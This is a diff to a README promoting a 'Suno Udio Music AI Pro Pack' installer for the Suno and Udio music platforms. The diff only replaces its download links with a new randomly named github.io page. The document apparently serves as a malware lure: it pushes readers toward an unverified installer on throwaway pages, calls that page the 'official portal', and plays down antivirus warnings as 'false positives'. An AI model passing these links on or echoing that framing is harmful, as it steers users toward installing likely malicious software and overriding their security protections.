@@ -2,7 +2,7 @@
 
 Suno Udio Music AI Pro Pack is a powerful, all-in-one toolkit designed to unlock the full creative potential of advanced music AI platforms like Suno and Udio. This comprehensive text to song generator package provides enthusiasts and creators with an extended set of features for music generation, helping you craft professional-quality tracks from simple text prompts. Dive into the future of music creation with this advanced music AI pack.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -41,4 +41,4 @@ A: Some security software may issue false positives for tools that modify applic
 
 Access the latest version of the installer and all related documentation through our official portal. This is your primary source for updates and support.
 
-[Download the complete suite from our official page](https://yellowtaxisave.github.io/download-page/)
+[Download the complete suite from our official page](https://capitals-707-bringing.github.io/download-page/)
